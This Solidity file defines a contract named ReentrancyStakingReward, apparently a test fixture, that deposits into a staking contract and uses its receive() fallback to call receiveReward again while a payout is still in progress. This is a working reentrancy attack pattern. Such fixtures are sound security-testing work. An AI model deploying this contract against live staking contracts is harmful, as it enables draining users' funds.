// SPDX-License-Identifier: UNLICENSED

// Author: TrejGun
// Email: trejgun@gemunion.io
// Website: https://gemunion.io/
import "../Exchange/interfaces/IAsset.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.13;

interface IStaking {
  function deposit(Params memory params, uint256[] calldata tokenIds) external payable;

  function receiveReward(uint256 stakeId, bool withdrawDeposit, bool breakLastPeriod) external;
}

contract ReentrancyStakingReward {
  address Staking;
  uint256 _stakeId;
  bool _withdrawDeposit;
  bool _breakLastPeriod;


  constructor(address _staking) {
    Staking = _staking;
  }

  function deposit(Params memory param, uint256[] calldata tokenIds) public payable {
    (bool success,) = Staking.call{ value: msg.value }(abi.encodeWithSelector(IStaking.deposit.selector, param, tokenIds));
    if(!success) {
        revert("Attaker: Deposit fail");
    }
  }

  function receiveReward(uint256 stakeId, bool withdrawDeposit, bool breakLastPeriod) public {
    _stakeId = stakeId;
    _withdrawDeposit = withdrawDeposit;
    _breakLastPeriod = breakLastPeriod;
    IStaking(Staking).receiveReward(stakeId, withdrawDeposit, breakLastPeriod);
  }

  receive() external payable {
    (bool success, ) = Staking.call(abi.encodeWithSelector(IStaking.receiveReward.selector, _stakeId, _withdrawDeposit, _breakLastPeriod));
    if(!success) {
        // do something...
    }
  }
}
